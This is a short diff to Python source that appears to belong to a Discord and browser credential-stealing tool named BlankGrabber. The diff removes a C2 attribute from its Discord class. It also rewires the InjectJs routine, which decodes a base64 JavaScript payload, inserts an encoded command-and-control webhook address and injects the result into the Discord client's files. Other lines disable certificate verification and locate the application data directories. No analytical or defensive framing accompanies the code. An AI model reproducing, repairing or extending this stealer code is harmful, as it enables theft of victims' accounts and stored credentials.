@@ -624,8 +624,6 @@ class Browsers:
             return autofills
 
 class Discord:
-    C2 = [0, ""]
-
     httpClient = PoolManager(cert_reqs="CERT_NONE") # Client for http requests
     ROAMING = os.getenv("appdata") # Roaming directory
     LOCALAPPDATA = os.getenv("localappdata") # Local application data directory
@@ -870,7 +868,7 @@ class Discord:
     def InjectJs() -> str | None: # Injects javascript into the Discord client's file
         check = False
         try:
-            code = base64.b64decode(b"%injectionbase64encoded%").decode(errors= "ignore").replace("'%WEBHOOKHEREBASE64ENCODED%'", "'{}'".format(base64.b64encode(Discord.C2[1].encode()).decode(errors= "ignore")))
+            code = base64.b64decode(b"%injectionbase64encoded%").decode(errors= "ignore").replace("'%WEBHOOKHEREBASE64ENCODED%'", "'{}'".format(base64.b64encode(BlankGrabber.C2[1].encode()).decode(errors= "ignore")))
         except Exception:
             return None
         
